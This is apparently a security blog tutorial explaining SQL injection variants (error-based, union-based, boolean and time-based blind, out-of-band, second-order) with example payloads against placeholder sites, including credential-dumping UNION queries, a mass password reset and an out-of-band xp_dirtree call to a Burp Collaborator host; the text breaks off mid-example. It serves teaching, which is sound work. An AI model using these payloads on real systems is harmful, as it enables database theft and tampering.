<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="SQL Injection" /><meta property="og:locale" content="en" /><meta name="description" content="A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database and RCE in some cases." /><meta property="og:description" content="A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database and RCE in some cases." /><link rel="canonical" href="https://s4yhii.github.io/posts/SQL-Injection/" /><meta property="og:url" content="https://s4yhii.github.io/posts/SQL-Injection/" /><meta property="og:site_name" content="s4yhii’s Blog" /><meta property="og:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png" /><meta property="og:image:height" content="1100" /><meta property="og:image:width" content="500" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-25T11:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png" /><meta property="twitter:title" content="SQL Injection" /><meta name="twitter:site" content="@s4yhii" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-30T14:34:27-05:00","datePublished":"2022-01-25T11:00:00-05:00","description":"A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database and RCE in some cases.","headline":"SQL Injection","image":{"height":1100,"width":500,"url":"https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4yhii.github.io/posts/SQL-Injection/"},"url":"https://s4yhii.github.io/posts/SQL-Injection/"}</script><title>SQL Injection | s4yhii's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="s4yhii's Blog"><meta name="application-name" content="s4yhii's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/streams/dance-pikachu.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">s4yhii's Blog</a></div><div class="site-subtitle font-italic">Appsec blog, CTF write-ups and more</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/s4yhii" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/s4yhii" aria-label="twitter" target="_blank" rel="noopener"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/jesusluj4n" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/274780" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SQL Injection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SQL Injection</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1643126400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 25, 2022 </em> </span> <span> Updated <em class="" data-ts="1659209667" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 30, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 1100'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png" class="preview-img bg" alt="Preview Image" width="500" height="1100" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/s4yhii">Jesus Lujan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1564 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p>A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database and RCE in some cases. <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli1.jpg" alt="" data-proofer-ignore></p><h2 id="in-band-classic-sql-injection"><span class="mr-2">In-Band (classic) SQL Injection</span><a href="#in-band-classic-sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Occurs when the attacker uses the same communication channel to both launch the attack and gather the result of the attack<ul><li>Retrieved data is presented directly in the web page</ul><li>Easier to exploit than other categories of SQLi</ul><h3 id="error-based-sqli"><span class="mr-2">Error-Based SQLi</span><a href="#error-based-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Error bases SQLi is an in-band SQLi technique that forces the database to generate an error, giving the attacker information upon which to refine their injection</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>www.random.com/app.php?id<span class="o">=</span><span class="s1">'
#output
#You have an error in your SQL syntax, check the manual that corresponds to your MySQL server version...
</span></pre></table></code></div></div><h3 id="union-based-sqli"><span class="mr-2">Union-Based SQLi</span><a href="#union-based-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Is an in-band SQLi technique that leverages the UNION SQL operator to combine the results of two queries into a single result set<li>Input:</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">#</span> <span class="n">retrieving</span> <span class="k">data</span> <span class="k">from</span> <span class="n">another</span> <span class="k">table</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">random</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="err">’</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span><span class="p">;</span> <span class="c1">--</span>

<span class="o">#</span> <span class="k">update</span> <span class="k">all</span> <span class="n">passwords</span> <span class="k">from</span> <span class="n">a</span> <span class="k">table</span> <span class="k">with</span> <span class="n">POST</span> <span class="k">method</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">random</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">new_password</span><span class="o">=</span><span class="nv">"password12345';--"</span>
<span class="n">query</span> <span class="o">=</span> <span class="k">UPDATE</span> <span class="n">Users</span> <span class="k">SET</span> <span class="n">Password</span><span class="o">=</span><span class="s1">'password12345'</span><span class="p">;</span><span class="c1">-- WHERE Id = 2;</span>

<span class="c1">--- The WHERE clause, which specifies the criteria of the rows that should be updated, is commented out in this query. The database would update all rows in the table, and change all of the passwords in the Users table to password12345. The attacker can now log in as anyone by using that password</span>
</pre></table></code></div></div><h2 id="inferential-blind-sql-injection"><span class="mr-2">Inferential (Blind) SQL Injection</span><a href="#inferential-blind-sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>SQLi vuln where there is no actual transfer of data via the webapp<li>Just as dangerous as in-band SQLi<ul><li>Attacker be able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server</ul><li>Takes longer to exploit than in-ban sql injection</ul><h3 id="boolean-based-sqli"><span class="mr-2">Boolean-based SQLi</span><a href="#boolean-based-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Uses boolean conditions to return a different result depending on whether the query returns a TRUE or FALSE result.</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">www</span><span class="p">.</span><span class="n">random</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span>
<span class="k">select</span> <span class="n">title</span> <span class="k">from</span> <span class="n">product</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span>
<span class="o">#</span><span class="n">Payload</span> <span class="mi">1</span> <span class="p">(</span><span class="k">false</span><span class="p">)</span>
<span class="n">www</span><span class="p">.</span><span class="n">random</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span>
<span class="k">select</span> <span class="n">title</span> <span class="k">from</span> <span class="n">product</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span>
<span class="o">#</span><span class="n">Payload</span> <span class="mi">2</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span>
<span class="n">www</span><span class="p">.</span><span class="n">random</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
<span class="k">select</span> <span class="n">title</span> <span class="k">from</span> <span class="n">product</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> 
</pre></table></code></div></div><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">User</span> <span class="k">table</span><span class="p">:</span>
<span class="n">Administrator</span> <span class="o">/</span> <span class="n">e3c3889ded99ej29dj9edjdje992</span>
<span class="k">SUBSTRING</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="k">c</span><span class="p">):</span> <span class="k">function</span> <span class="n">that</span> <span class="k">select</span> <span class="n">a</span> <span class="n">part</span> <span class="k">of</span> <span class="n">a</span> <span class="n">string</span> <span class="n">a</span><span class="p">:</span> <span class="n">the</span> <span class="n">string</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span><span class="n">the</span> <span class="k">first</span> <span class="n">posicion</span><span class="p">,</span> <span class="k">c</span><span class="o">=</span><span class="n">how</span> <span class="n">many</span> <span class="n">chars</span>
<span class="o">#</span><span class="n">Payload1</span>
<span class="n">www</span><span class="p">.</span><span class="n">random</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">Password</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">WHERE</span> <span class="n">Username</span> <span class="o">=</span><span class="s1">'Administrator'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'s'</span>
<span class="o">#</span><span class="n">Query</span>
<span class="k">select</span> <span class="n">title</span> <span class="k">from</span> <span class="n">product</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">Password</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">Where</span> <span class="n">Username</span><span class="o">=</span><span class="s1">'Administrator'</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'s'</span>
<span class="o">#</span><span class="k">result</span><span class="p">:</span> <span class="k">nothing</span> <span class="k">is</span> <span class="n">returned</span> <span class="n">because</span> <span class="k">is</span> <span class="k">false</span>

<span class="o">#</span><span class="n">Payload</span> <span class="mi">2</span>
<span class="n">www</span><span class="p">.</span><span class="n">random</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">Password</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">Where</span> <span class="n">Username</span><span class="o">=</span><span class="s1">'Administrator'</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'e'</span>
<span class="o">#</span><span class="n">Query</span>
<span class="k">select</span> <span class="n">title</span> <span class="k">from</span> <span class="n">product</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">Password</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">WHERE</span> <span class="n">Username</span><span class="o">=</span><span class="s1">'Administrator'</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'e'</span>
<span class="o">#</span><span class="k">result</span><span class="p">:</span> <span class="n">Returned</span> <span class="k">true</span><span class="p">,</span> <span class="n">the</span> <span class="n">tile</span> <span class="k">of</span> <span class="n">product</span> <span class="n">id</span> <span class="mi">1</span> <span class="k">is</span> <span class="n">returned</span> <span class="n">bc</span> <span class="nv">"e"</span> <span class="k">is</span> <span class="n">the</span> <span class="k">first</span> <span class="nb">character</span> <span class="k">of</span> <span class="n">the</span> <span class="n">hashed</span> <span class="n">pass</span>
</pre></table></code></div></div><h3 id="time-based-blind-sqli"><span class="mr-2">Time-based Blind SQLi</span><a href="#time-based-blind-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Relies in the database pausing for a specified amount of time, then returning the result, indicating a success SQL query execution<li>Ex: if the first character of the administrator’s hashed pass is an “a”, wait 10 seconds.</ul><h2 id="out-of-band-oast-sqli"><span class="mr-2">Out-of-band (OAST) SQLi</span><a href="#out-of-band-oast-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Consists of triggering an out-of-band network connection to a system that you control<ul><li>Not common, uses variety os protocols (DNS,HTTP)</ul></ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s1">'; exec master..xp_dirtree '</span><span class="o">//</span><span class="mi">434934839493499</span><span class="p">.</span><span class="n">burpcollabolator</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">a</span><span class="s1">'--
</span></pre></table></code></div></div><h2 id="second-order-sqli"><span class="mr-2">Second order SQLi</span><a href="#second-order-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Second order SQLi happens when applications user input gets stored in the database, then retrieved and used unsafely in a SQL query. For example consider an app that register an user by specifying username and password, and the user submit the following request:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">POST</span> <span class="o">/</span><span class="n">register</span>
<span class="k">Host</span><span class="p">:</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span>

<span class="p">(</span><span class="n">POST</span> <span class="n">body</span><span class="p">)</span>
<span class="n">username</span><span class="o">=</span><span class="s1">'jesus'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">Username</span><span class="p">,</span> <span class="n">Password</span> <span class="k">FROM</span> <span class="n">Users</span><span class="p">;</span><span class="c1">-- '&amp;password=jesus123</span>
</pre></table></code></div></div><p>This query has a payload in the username field, later the malicious user accesses their email with the following GET request:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>GET /emails
Host: example.com
</pre></table></code></div></div><p>If the user doesn’t provide a username the app will retrieve the currently logged-in username and use it populate a SQL query:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">Title</span><span class="p">,</span> <span class="n">Body</span> <span class="k">FROM</span> <span class="n">Emails</span> <span class="k">WHERE</span> <span class="n">Username</span><span class="o">=</span><span class="s1">'jesus'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">Username</span><span class="p">,</span> <span class="n">Password</span> <span class="k">FROM</span> <span class="n">Users</span><span class="p">;</span><span class="c1">--</span>
</pre></table></code></div></div><p>But the attacker username contains the payload, so this will return all usernames and password as email titles and bodies in the HTTP response.</p><h2 id="exploiting-the-database"><span class="mr-2">Exploiting the Database</span><a href="#exploiting-the-database" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="exploiting-error-based-sqli"><span class="mr-2">Exploiting Error-Based SQLi</span><a href="#exploiting-error-based-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Submit SQL-specific characters such as ‘ or “, and look for error or other anomalies<li>Different characters give you different error</ul><h3 id="exploiting-union-based-sqli"><span class="mr-2">Exploiting Union-Based SQLi</span><a href="#exploiting-union-based-sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>There are two rules for combining the result sets of two queries by using <strong>UNION</strong></p><ul><li>The number and order of the columns must be the same in all queries<li>The data types must be compatible</ul><p><strong>Steps</strong></p><ul><li>Figure out the number of columns that the query is making using <strong>ORDER BY</strong><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">select</span> <span class="n">title</span><span class="p">,</span> <span class="n">cost</span> <span class="k">from</span> <span class="n">product</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">order</span> <span class="k">by</span> <span class="mi">1</span>
</pre></table></code></div></div><ul><li>Incrementally inject a series of ORDER BY clauses until you get an error or observe a different behavior in the application<div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">order</span> <span class="k">by</span> <span class="mi">1</span><span class="c1">--</span>
<span class="k">order</span> <span class="k">by</span> <span class="mi">2</span><span class="c1">--</span>
<span class="k">order</span> <span class="k">by</span> <span class="mi">3</span><span class="c1">-- </span>
</pre></table></code></div></div><li>The ORDER BY position number 3 is out of range, this means the table has only two columns<li>Other method for determining the numbers of columns is using <strong>NULL VALUES</strong>:<div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">select</span> <span class="n">title</span><span class="p">,</span> <span class="n">cost</span> <span class="k">from</span> <span class="n">product</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="c1">--</span>
</pre></table></code></div></div><li>If not error is returned qe have to increase the NULL VALUES<div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="c1">--</span>
<span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span> <span class="k">NULL</span> <span class="c1">--</span>
</pre></table></code></div></div></ul><li>Figure the data types of the columns (interested in string data)<ul><li>Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn</ul></ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">UNION</span> <span class="k">SELECT</span> <span class="s1">'a'</span><span class="p">,</span> <span class="k">NULL</span><span class="c1">--</span>
<span class="o">#</span><span class="n">Response</span><span class="p">:</span><span class="k">Conversion</span> <span class="n">failed</span> <span class="k">when</span> <span class="n">converting</span> <span class="n">the</span> <span class="nb">varchar</span> <span class="n">value</span> <span class="s1">'a'</span> <span class="k">to</span> <span class="k">data</span> <span class="k">type</span> <span class="nb">int</span>

<span class="k">UNION</span> <span class="k">SELECT</span> <span class="s1">'a'</span><span class="p">,</span> <span class="k">NULL</span><span class="c1">--</span>
<span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span><span class="s1">'a'</span><span class="c1">--</span>
